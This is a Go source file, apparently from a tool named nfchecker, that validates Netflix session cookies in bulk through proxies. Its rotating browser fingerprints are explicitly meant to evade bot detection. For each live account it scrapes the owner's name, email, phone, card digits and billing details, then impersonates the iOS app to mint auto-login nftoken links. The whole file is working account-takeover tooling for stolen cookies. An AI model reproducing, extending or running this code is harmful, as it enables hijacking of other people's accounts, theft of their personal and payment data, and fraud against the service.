// Package checker implements the 3-step Netflix cookie validation pipeline.
package checker

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
	"unicode"

	"github.com/nfchecker/internal/models"
	"github.com/nfchecker/internal/proxy"
)

// -----------------------------------------------------------------
// HTTP transport pool & clients — shared transports for connection reuse
// -----------------------------------------------------------------

var (
	directTransport = newTransport(nil)
	directClient    = &http.Client{
		Timeout: 20 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse // manual redirect handling
		},
		Transport: directTransport,
	}
	directFTLClient = &http.Client{
		Timeout:   30 * time.Second,
		Transport: directTransport,
	}
)

func newTransport(px *proxy.Proxy) *http.Transport {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
		DialContext: (&net.Dialer{
			Timeout:   15 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		MaxIdleConns:          500,
		MaxIdleConnsPerHost:   50,
		IdleConnTimeout:       90 * time.Second,
		TLSHandshakeTimeout:   10 * time.Second,
		ResponseHeaderTimeout: 30 * time.Second,
		DisableCompression:    false,
		ForceAttemptHTTP2:     false, // Netflix FTL doesn't always like h2
	}
	if px != nil && px.URL != nil {
		tr.Proxy = http.ProxyURL(px.URL)
	}
	return tr
}

// newHTTPClient returns a client backed by shared or proxy-specific transport.
// proxyTransports keeps one transport per proxy URL so keep-alive
// connections are reused instead of a fresh TCP+TLS handshake per check.
var proxyTransports sync.Map

func transportFor(px *proxy.Proxy) *http.Transport {
	if px == nil || px.URL == nil {
		return directTransport
	}
	key := px.URL.String()
	if cached, ok := proxyTransports.Load(key); ok {
		return cached.(*http.Transport)
	}
	built := newTransport(px)
	actual, _ := proxyTransports.LoadOrStore(key, built)
	return actual.(*http.Transport)
}

func newHTTPClient(px *proxy.Proxy, timeoutSec int) *http.Client {
	if px == nil || px.URL == nil {
		if timeoutSec == 30 {
			return directFTLClient
		}
		return directClient
	}
	return &http.Client{
		Timeout: time.Duration(timeoutSec) * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse // manual redirect handling
		},
		Transport: transportFor(px),
	}
}

// -----------------------------------------------------------------
// Step 1 – Session Validation
// -----------------------------------------------------------------

const membershipURL = "https://www.netflix.com/account/membership"

// webUAs is rotated per request. One frozen User-Agent across thousands of
// checks from the same address is an easy bot signal, and the edge answers it
// with 403/429 pages that used to land in a run as hard errors.
var webUAs = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
	"Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
}

var acceptLanguages = []string{
	"en-US,en;q=0.9",
	"en-US,en;q=0.9,es;q=0.8",
	"en-GB,en;q=0.9",
	"en-US,en;q=0.8,fr;q=0.6",
	"en-US,en;q=0.9,de;q=0.8",
}

var browserRotation uint64

func nextBrowser() (string, string) {
	i := atomic.AddUint64(&browserRotation, 1)
	return webUAs[int(i)%len(webUAs)], acceptLanguages[int(i)%len(acceptLanguages)]
}

// applyBrowserHeaders makes the membership request look like a real browser
// navigation. The Sec-Fetch / Upgrade-Insecure-Requests headers are what a
// bare Go request omits first, and their absence is a cheap way to spot a bot.
func applyBrowserHeaders(req *http.Request) {
	ua, lang := nextBrowser()
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", lang)
	// No explicit Accept-Encoding: the transport then negotiates gzip and
	// decompresses it transparently. Forcing "identity" pulled the whole
	// (measured) ~580 KB HTML page through the proxy for every valid cookie,
	// which is ~6.6x the bytes and burns a metered proxy plan in a day.
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", "none")
	req.Header.Set("Sec-Fetch-User", "?1")
	req.Header.Set("Cache-Control", "max-age=0")
}

// HTTPStatusError keeps the status code so the worker can tell a rate limit
// apart from a dead cookie and retry with a real delay.
type HTTPStatusError struct {
	Code       int
	RetryAfter time.Duration
}

func (e *HTTPStatusError) Error() string {
	if e.RetryAfter > 0 {
		return fmt.Sprintf("status %d (retry after %s)", e.Code, e.RetryAfter)
	}
	return fmt.Sprintf("status %d", e.Code)
}

// transientStatus reports whether the edge refused the request rather than
// the cookie being invalid. Those are worth another attempt.
func transientStatus(code int) bool {
	switch code {
	case 408, 425, 429, 500, 502, 503, 504, 520, 521, 522, 523, 524:
		return true
	}
	return false
}

func newStatusError(resp *http.Response) *HTTPStatusError {
	err := &HTTPStatusError{Code: resp.StatusCode}
	if err.Code == 429 || err.Code == 503 {
		raw := strings.TrimSpace(resp.Header.Get("Retry-After"))
		if seconds, convErr := strconv.Atoi(raw); convErr == nil && seconds > 0 {
			if seconds > 10 {
				seconds = 10
			}
			err.RetryAfter = time.Duration(seconds) * time.Second
		}
	}
	return err
}

// ValidateResult is returned from Step 1.
type ValidateResult struct {
	Valid      bool
	PageBody   string
	Err        error
	RetryAfter time.Duration
}

// ValidateSession checks whether the cookie is still valid by hitting the
// Netflix membership page. Accepts an optional context for cancellation.
func ValidateSession(ctx context.Context, cs *models.CookieSet, px *proxy.Proxy) *ValidateResult {
	client := newHTTPClient(px, 20)

	req, err := http.NewRequestWithContext(ctx, "GET", membershipURL, nil)
	if err != nil {
		return &ValidateResult{Err: err}
	}

	applyBrowserHeaders(req)
	setCookies(req, cs)

	resp, err := client.Do(req)
	if err != nil {
		return &ValidateResult{Err: err}
	}
	defer resp.Body.Close()

	finalURL := resp.Request.URL.String()

	// Follow redirects manually up to 10 hops (resolve relative locations)
	for hops := 0; hops < 10 && (resp.StatusCode == 301 || resp.StatusCode == 302 || resp.StatusCode == 307 || resp.StatusCode == 308); hops++ {
		loc := resp.Header.Get("Location")
		if loc == "" {
			break
		}
		if strings.Contains(loc, "login") {
			return &ValidateResult{Valid: false}
		}
		locURL, err := resp.Request.URL.Parse(loc)
		if err != nil {
			return &ValidateResult{Err: err}
		}
		if strings.Contains(locURL.Path, "login") {
			return &ValidateResult{Valid: false}
		}

		req2, err2 := http.NewRequestWithContext(ctx, "GET", locURL.String(), nil)
		if err2 != nil {
			return &ValidateResult{Err: err2}
		}
		applyBrowserHeaders(req2)
		setCookies(req2, cs)
		resp2, err2 := client.Do(req2)
		if err2 != nil {
			return &ValidateResult{Err: err2}
		}
		resp.Body.Close()
		resp = resp2
		finalURL = resp.Request.URL.String()
	}

	// Check final URL
	if strings.Contains(finalURL, "/login") {
		return &ValidateResult{Valid: false}
	}
	if resp.StatusCode != 200 {
		statusErr := newStatusError(resp)
		if transientStatus(resp.StatusCode) {
			// Retryable: the edge refused us, the cookie may still be valid.
			return &ValidateResult{Err: statusErr, RetryAfter: statusErr.RetryAfter}
		}
		return &ValidateResult{Valid: false, Err: statusErr}
	}

	body, err := readBodyLimited(resp, 4*1024*1024) // 4MB limit
	if err != nil {
		return &ValidateResult{Err: err}
	}

	return &ValidateResult{Valid: true, PageBody: body}
}

func setCookies(req *http.Request, cs *models.CookieSet) {
	var parts []string
	if cs.NetflixId != "" {
		parts = append(parts, "NetflixId="+cs.NetflixId)
	}
	if cs.SecureNetflixId != "" {
		parts = append(parts, "SecureNetflixId="+cs.SecureNetflixId)
	}
	if cs.NfvdId != "" {
		parts = append(parts, "nfvdid="+cs.NfvdId)
	}
	if cs.OptanonConsent != "" {
		parts = append(parts, "OptanonConsent="+cs.OptanonConsent)
	}
	req.Header.Set("Cookie", strings.Join(parts, "; "))
}

// -----------------------------------------------------------------
// Step 2 – Account Data Extraction
// -----------------------------------------------------------------

// regexSet holds multiple fallback patterns for a single field.
type regexSet []*regexp.Regexp

func (rs regexSet) find(text string) string {
	for _, re := range rs {
		if m := re.FindStringSubmatch(text); len(m) > 1 {
			return decodeEscapes(m[1])
		}
	}
	return "Unknown"
}

func (rs regexSet) findBool(text string) string {
	for _, re := range rs {
		if m := re.FindStringSubmatch(text); len(m) > 1 {
			if m[1] == "true" {
				return "Yes"
			}
			return "No"
		}
	}
	return "Unknown"
}

// Pre-compiled regexes (compiled once at startup)
var (
	reName = regexSet{
		regexp.MustCompile(`userInfo"\s*:\s*\{\s*"name"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"accountOwnerName"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"name"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"firstName"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"displayName"\s*:\s*"([^"]+)"`),
	}
	reEmail = regexSet{
		regexp.MustCompile(`"emailAddress"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"email"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"loginId"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"contactEmail"\s*:\s*"([^"]+)"`),
	}
	reCountry = regexSet{
		regexp.MustCompile(`"currentCountry"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"countryOfSignup"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"country"\s*:\s*"([A-Z]{2})"`),
	}
	rePlan = regexSet{
		regexp.MustCompile(`"MemberPlan"[\s\S]*?"localizedPlanName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`localizedPlanName\\\":{\\\"fieldType\\\":\\\"String\\\",\\\"value\\\":\\\"([^"]+)`),
		regexp.MustCompile(`"localizedPlanName"\s*:\s*"([^"]+)"`),
		// Some markets order the localizedPlanName / planName object
		// differently, so the value can sit anywhere inside it.
		regexp.MustCompile(`"localizedPlanName"[\s\S]{0,160}?"value"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"planName"[\s\S]{0,160}?"value"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"planName"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"currentPlan"[\s\S]{0,200}"name"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"currentPlan"[\s\S]{0,300}?"localizedPlanName"[\s\S]{0,160}?"value"\s*:\s*"([^"]+)"`),
	}
	// rePlanCode is locale independent: the tier's machine name, used when
	// the localised display name is missing or worded in an unknown language.
	rePlanCode = regexSet{
		regexp.MustCompile(`"planCode"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"currentPlanCode"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"planId"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"currentPlanId"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"planType"\s*:\s*"([^"]+)"`),
	}
	reMemberSince = regexSet{
		regexp.MustCompile(`"memberSince"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"joinDate"\s*:\s*"([^"]+)"`),
	}
	reNextBilling = regexSet{
		regexp.MustCompile(`"GrowthNextBillingDate"\s*,\s*"date"\s*:\s*"([^"T]+)T`),
		regexp.MustCompile(`"nextBillingDate"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"nextBilling"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"nextCycleDate"\s*:\s*"([^"]+)"`),
	}
	rePayment = regexSet{
		regexp.MustCompile(`"paymentMethod"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"paymentOptionLogo"\s*:\s*\{\s*"paymentOptionLogo"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"paymentMethodType"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"paymentMethod"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"pmtMethodType"\s*:\s*"([^"]+)"`),
	}
	reCard = regexSet{
		regexp.MustCompile(`"GrowthCardPaymentMethod"[\s\S]{0,300}"displayText"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"paymentMethodLast4"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"lastFour"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"last4"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"displayText"\s*:\s*"([•*]{3,4}\s*\d{4})"`),
	}
	rePhone = regexSet{
		regexp.MustCompile(`"phoneNumberDigits"\s*:\s*\{[\s\S]{0,200}"value"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"phoneNumber"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"phone"\s*:\s*"([^"]+)"`),
	}
	rePrice = regexSet{
		regexp.MustCompile(`"formattedPlanPrice"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"formattedPrice"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"planPriceDisplay"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"displayPrice"\s*:\s*"([^"]+)"`),
		// Markets that bill in a currency usually send the amount and the
		// currency code separately; the key names differ by locale.
		regexp.MustCompile(`"priceAmount"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"formattedAmount"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"priceString"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"planPrice"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"price"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"`),
	}
	reCurrency = regexSet{
		regexp.MustCompile(`"currencyCode"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"planCurrency"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"localCurrency"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"currency"\s*:\s*"([A-Za-z]{2,3})"`),
	}
	reQuality = regexSet{
		regexp.MustCompile(`videoQuality"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"videoQuality"\s*:\s*"([^"]+)"`),
	}
	reGUID = regexSet{
		regexp.MustCompile(`"userGuid"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"guid"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"memberGuid"\s*:\s*"([^"]+)"`),
	}
	reMembership = regexSet{
		regexp.MustCompile(`"membershipStatus"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`"status"\s*:\s*"(CURRENT_MEMBER|GRACE_PERIOD|NEVER_MEMBER|CANCELLED)[^"]*"`),
	}
	reEmailVerified = regexSet{
		regexp.MustCompile(`"isEmailVerified"\s*:\s*(true|false)`),
		regexp.MustCompile(`"emailAddressVerified"\s*:\s*(true|false)`),
		regexp.MustCompile(`"contactEmailVerified"\s*:\s*(true|false)`),
	}
	reHoldStatus = regexSet{
		regexp.MustCompile(`"isUserOnHold"\s*:\s*(true|false)`),
		regexp.MustCompile(`"holdStatus"\s*:\s*(true|false)`),
		regexp.MustCompile(`"isOnHold"\s*:\s*(true|false)`),
	}
	reExtraMember = regexSet{
		regexp.MustCompile(`"showExtraMemberSection"\s*:\s*(true|false)`),
	}
	reProfiles  = regexp.MustCompile(`"profileName"\s*:\s*"([^"]+)"`)
	reExtraAlt  = regexp.MustCompile(`(?i)extra\s+on\s+someone.?else.?s\s+plan`)
	reIsAdsPlan = regexp.MustCompile(`(?i)(standard with ads|basic with ads|ads-supported)`)
)

// planNameAliases folds Netflix's localised plan names into the English
// tokens the classifier below understands, so a pt-BR "Padrão com anúncios"
// or an es-ES "Estándar con anuncios" is classified instead of "unknown".
var planNameAliases = []struct{ from, to string }{
	{"padrão", "standard"}, {"padrao", "standard"},
	{"estándar", "standard"}, {"estandar", "standard"},
	{"standart", "standard"}, {"standaard", "standard"},
	{"standardowy", "standard"}, {"стандарт", "standard"},
	{"スタンダード", "standard"}, {"스탠다드", "standard"},
	{"标准", "standard"}, {"標準", "standard"},
	{"básico", "basic"}, {"basico", "basic"}, {"basique", "basic"},
	{"basis", "basic"}, {"podstawowy", "basic"}, {"базовый", "basic"},
	{"ベーシック", "basic"}, {"기본", "basic"},
	{"基础", "basic"}, {"基礎", "basic"},
	{"premium", "premium"}, {"premiun", "premium"}, {"prémium", "premium"},
	{"премиум", "premium"}, {"преміум", "premium"}, {"премијум", "premium"},
	{"بريميوم", "premium"}, {"پرمیوم", "premium"},
	{"プレミアム", "premium"}, {"프리미엄", "premium"},
	{"高级", "premium"}, {"高級", "premium"},
	// Turkish ("Özel") and Vietnamese ("Cao cấp") name Premium with their own
	// words, and Hindi / Thai use native scripts.
	{"özel", "premium"}, {"cao cấp", "premium"},
	{"प्रीमियम", "premium"}, {"พรีเมียม", "premium"},
	{"anúncios", "ads"}, {"anuncios", "ads"}, {"anoncios", "ads"},
	{"anúncio", "ads"}, {"anuncio", "ads"},
	{"publicidad", "ads"}, {"pubblicità", "ads"}, {"pubblicita", "ads"},
	{"werbung", "ads"}, {"avec pub", "ads"}, {"met reclame", "ads"},
	{"reklam", "ads"}, {"광고", "ads"}, {"広告", "ads"},
	{"广告", "ads"}, {"廣告", "ads"}, {"реклам", "ads"}, {"إعلان", "ads"},
	{"standar", "standard"}, {"tiêu chuẩn", "standard"}, {"tieu chuan", "standard"},
	{"סטנדרטי", "standard"}, {"قياسي", "standard"}, {"मानक", "standard"},
	{"มาตรฐาน", "standard"},
	{"dasar", "basic"}, {"temel", "basic"}, {"cơ bản", "basic"}, {"co ban", "basic"},
	{"בסיסי", "basic"}, {"أساسي", "basic"}, {"बेसिक", "basic"}, {"พื้นฐาน", "basic"},
	{"alap", "basic"}, {"základní", "basic"}, {"zakladni", "basic"}, {"perus", "basic"},
	{"premijum", "premium"}, {"פרימיום", "premium"},
	{"publicit", "ads"}, {"publicité", "ads"}, {"pubblicità", "ads"},
	{"annonce", "ads"}, {"annonces", "ads"}, {"annonser", "ads"}, {"annoncer", "ads"},
	{"iklan", "ads"}, {"reklamami", "ads"}, {"reklamları", "ads"}, {"reklamli", "ads"},
	{"oglas", "ads"}, {"oglasima", "ads"}, {"hirdetés", "ads"}, {"hirdetes", "ads"},
	{"โฆษณา", "ads"}, {"פרסומות", "ads"}, {"إعلانات", "ads"},
}

// normalizePlanName returns the lower-cased plan name with an English
// canonical token appended for every localised word it contains.
func normalizePlanName(plan string) string {
	lower := strings.ToLower(strings.TrimSpace(plan))
	if lower == "" {
		return lower
	}
	var b strings.Builder
	b.WriteString(lower)
	for _, alias := range planNameAliases {
		if strings.Contains(lower, alias.from) {
			b.WriteString(" ")
			b.WriteString(alias.to)
		}
	}
	return b.String()
}

// ExtractAccountInfo parses account details from the membership page HTML.
func ExtractAccountInfo(page string, cs *models.CookieSet) *models.AccountInfo {
	info := &models.AccountInfo{}

	info.Name = reName.find(page)
	info.Email = reEmail.find(page)
	info.Country = reCountry.find(page)
	info.CountryFlag = countryFlag(info.Country)
	info.Plan = rePlan.find(page)
	info.PlanCode = rePlanCode.find(page)
	info.MemberSince = reMemberSince.find(page)
	info.NextBilling = reNextBilling.find(page)
	info.Payment = rePayment.find(page)
	info.Card = reCard.find(page)
	if info.Card == "Unknown" {
		info.Card = "None"
	}
	info.Phone = rePhone.find(page)
	if info.Phone == "Unknown" {
		info.Phone = "None"
	}
	info.Price = rePrice.find(page)
	info.Currency = reCurrency.find(page)
	if info.Currency == "Unknown" {
		info.Currency = ""
	}
	info.VideoQuality = reQuality.find(page)
	info.UserGUID = reGUID.find(page)
	info.MembershipStatus = reMembership.find(page)
	info.EmailVerified = reEmailVerified.findBool(page)
	info.HoldStatus = reHoldStatus.findBool(page)

	extraFlag := reExtraMember.findBool(page)
	if extraFlag == "Yes" || reExtraAlt.MatchString(page) {
		info.ExtraMember = "Yes"
	} else {
		info.ExtraMember = "No"
	}

	// Profiles – deduplicate preserving order
	seen := make(map[string]bool)
	for _, m := range reProfiles.FindAllStringSubmatch(page, -1) {
		if !seen[m[1]] {
			seen[m[1]] = true
			info.Profiles = append(info.Profiles, decodeEscapes(m[1]))
		}
	}

	// Plan type classification (accuracy improvements). The plan code is
	// appended so a localised name the alias table does not know still
	// falls back to the tier's machine-readable value instead of "unknown".
	info.IsOnHold = info.HoldStatus == "Yes"
	classifySource := strings.TrimSpace(info.Plan + " " + info.PlanCode)
	planLower := normalizePlanName(classifySource)
	switch {
	case strings.Contains(planLower, "premium"):
		info.PlanType = "premium"
		info.Streams = 4
		if info.VideoQuality == "Unknown" {
			info.VideoQuality = "4K+HDR"
		}
	case strings.Contains(planLower, "standard") && (strings.Contains(planLower, "ads") || reIsAdsPlan.MatchString(info.Plan)):
		info.PlanType = "standard_with_ads"
		info.IsAdsTier = true
		info.Streams = 2
		if info.VideoQuality == "Unknown" {
			info.VideoQuality = "HD"
		}
	case strings.Contains(planLower, "standard"):
		info.PlanType = "standard"
		info.Streams = 2
		if info.VideoQuality == "Unknown" {
			info.VideoQuality = "HD"
		}
	case strings.Contains(planLower, "basic") && (strings.Contains(planLower, "ads") || reIsAdsPlan.MatchString(info.Plan)):
		info.PlanType = "basic_with_ads"
		info.IsAdsTier = true
		info.Streams = 1
		if info.VideoQuality == "Unknown" {
			info.VideoQuality = "SD"
		}
	case strings.Contains(planLower, "basic"):
		info.PlanType = "basic"
		info.Streams = 1
		if info.VideoQuality == "Unknown" {
			info.VideoQuality = "SD"
		}
	default:
		info.PlanType = "unknown"
		info.Streams = 2
		if info.VideoQuality == "Unknown" {
			info.VideoQuality = "HD"
		}
	}
	info.MembershipCategory = info.PlanType

	// Validity window
	if cs.CookieExpires > 0 {
		expT := time.Unix(cs.CookieExpires, 0).UTC()
		info.ValidTillUTC = expT.Format("2006-01-02 15:04:05 UTC")
		rem := time.Until(expT)
		if rem < 0 {
			rem = 0
		}
		info.RemainingHours = int(rem.Hours())
		info.RemainingMinutes = int(rem.Minutes()) % 60
	}

	return info
}

// -----------------------------------------------------------------
// Step 3 – nftoken Generation via iOS FTL API
// -----------------------------------------------------------------

const ftlURL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"

// FetchNfToken fetches the auto-login token using the iOS FTL API.
// Accepts an optional context for cancellation.
func FetchNfToken(ctx context.Context, cs *models.CookieSet, px *proxy.Proxy) (*models.NfToken, error) {
	client := newHTTPClient(px, 30)

	params := url.Values{}
	params.Set("appVersion", "15.48.1")
	params.Set("config", `{"gamesInTrailersEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","billboardEnabled":"true","sharksEnabled":"true"}`)
	params.Set("device_type", "NFAPPL-02-")
	params.Set("esn", "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200")
	params.Set("idiom", "phone")
	params.Set("iosVersion", "15.8.5")
	params.Set("isTablet", "false")
	params.Set("languages", "en-US")
	params.Set("locale", "en-US")
	params.Set("maxDeviceWidth", "375")
	params.Set("model", "saget")
	params.Set("modelType", "IPHONE8-1")
	params.Set("odpAware", "true")
	params.Set("path", `["account","token","default"]`)
	params.Set("pathFormat", "graph")
	params.Set("pixelDensity", "2.0")
	params.Set("progressive", "false")
	params.Set("responseFormat", "json")

	reqURL := ftlURL + "?" + params.Encode()

	req, err := http.NewRequestWithContext(ctx, "GET", reqURL, nil)
	if err != nil {
		return nil, err
	}

	req.Header.Set("User-Agent", "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)")
	req.Header.Set("x-netflix.request.attempt", "1")
	req.Header.Set("x-netflix.request.client.user.guid", "A4CS633D7VCBPE2GPK2HL4EKOE")
	req.Header.Set("x-netflix.context.profile-guid", "A4CS633D7VCBPE2GPK2HL4EKOE")
	req.Header.Set("x-netflix.request.routing", `{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}`)
	req.Header.Set("x-netflix.context.app-version", "15.48.1")
	req.Header.Set("x-netflix.argo.translated", "true")
	req.Header.Set("x-netflix.context.form-factor", "phone")
	req.Header.Set("x-netflix.context.sdk-version", "2012.4")
	req.Header.Set("x-netflix.client.appversion", "15.48.1")
	req.Header.Set("x-netflix.context.max-device-width", "375")
	req.Header.Set("x-netflix.context.ab-tests", "")
	req.Header.Set("x-netflix.tracing.cl.useractionid", "4DC655F2-9C3C-4343-8229-CA1B003C3053")
	req.Header.Set("x-netflix.client.type", "argo")
	req.Header.Set("x-netflix.client.ftl.esn", "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200")
	req.Header.Set("x-netflix.context.locales", "en-US")
	req.Header.Set("x-netflix.context.top-level-uuid", "90AFE39F-ADF1-4D8A-B33E-528730990FE3")
	req.Header.Set("x-netflix.client.iosversion", "15.8.5")
	req.Header.Set("accept-language", "en-US;q=1")
	req.Header.Set("x-netflix.argo.abtests", "")
	req.Header.Set("x-netflix.context.os-version", "15.8.5")
	req.Header.Set("x-netflix.request.client.context", `{"appState":"foreground"}`)
	req.Header.Set("x-netflix.context.ui-flavor", "argo")
	req.Header.Set("x-netflix.argo.nfnsm", "9")
	req.Header.Set("x-netflix.context.pixel-density", "2.0")
	req.Header.Set("x-netflix.request.toplevel.uuid", "90AFE39F-ADF1-4D8A-B33E-528730990FE3")
	req.Header.Set("x-netflix.request.client.timezoneid", "Asia/Dhaka")
	req.Header.Set("Cookie", "NetflixId="+cs.NetflixId)

	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("FTL request error: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		body, _ := readBodyLimited(resp, 512)
		return nil, fmt.Errorf("FTL status %d: %s", resp.StatusCode, body)
	}

	var result map[string]interface{}
	body, err := readBodyLimited(resp, 1*1024*1024)
	if err != nil {
		return nil, err
	}
	if err := json.Unmarshal([]byte(body), &result); err != nil {
		return nil, fmt.Errorf("FTL JSON parse error: %w", err)
	}

	token, expires := extractToken(result)
	if token == "" {
		return nil, fmt.Errorf("token field missing in FTL response")
	}

	return &models.NfToken{
		Token:     token,
		Expires:   expires,
		PhoneLink: "https://netflix.com/unsupported?nftoken=" + token,
		PCLink:    "https://netflix.com/?nftoken=" + token,
		TVLink:    "https://www.netflix.com/tv2?nftoken=" + token,
	}, nil
}

func extractToken(result map[string]interface{}) (string, int64) {
	v, _ := result["value"].(map[string]interface{})
	if v == nil {
		return "", 0
	}
	acc, _ := v["account"].(map[string]interface{})
	if acc == nil {
		return "", 0
	}
	tok, _ := acc["token"].(map[string]interface{})
	if tok == nil {
		return "", 0
	}
	def, _ := tok["default"].(map[string]interface{})
	if def == nil {
		return "", 0
	}
	token, _ := def["token"].(string)
	var expires int64
	switch e := def["expires"].(type) {
	case float64:
		expires = int64(e)
	case int64:
		expires = e
	}
	return token, expires
}

// -----------------------------------------------------------------
// Helpers
// -----------------------------------------------------------------

func readBodyLimited(resp *http.Response, maxBytes int64) (string, error) {
	lr := io.LimitReader(resp.Body, maxBytes)
	b, err := io.ReadAll(lr)
	if err != nil {
		return "", err
	}
	return string(b), nil
}

func decodeEscapes(s string) string {
	var out strings.Builder
	out.Grow(len(s))
	i := 0
	for i < len(s) {
		if s[i] == '\\' && i+1 < len(s) {
			switch s[i+1] {
			case 'x', 'X':
				if i+3 < len(s) {
					var v rune
					fmt.Sscanf(s[i+2:i+4], "%x", &v)
					out.WriteRune(v)
					i += 4
					continue
				}
			case 'u', 'U':
				end := i + 6
				if end <= len(s) {
					var v rune
					fmt.Sscanf(s[i+2:i+6], "%x", &v)
					if unicode.IsGraphic(v) {
						out.WriteRune(v)
						i += 6
						continue
					}
				}
			}
		}
		out.WriteByte(s[i])
		i++
	}
	return out.String()
}

// countryFlag converts ISO-3166 2-letter code to flag emoji.
func countryFlag(code string) string {
	code = strings.ToUpper(strings.TrimSpace(code))
	if len(code) != 2 {
		return ""
	}
	return string(rune(0x1F1E6+int32(code[0]-'A'))) + string(rune(0x1F1E6+int32(code[1]-'A')))
}
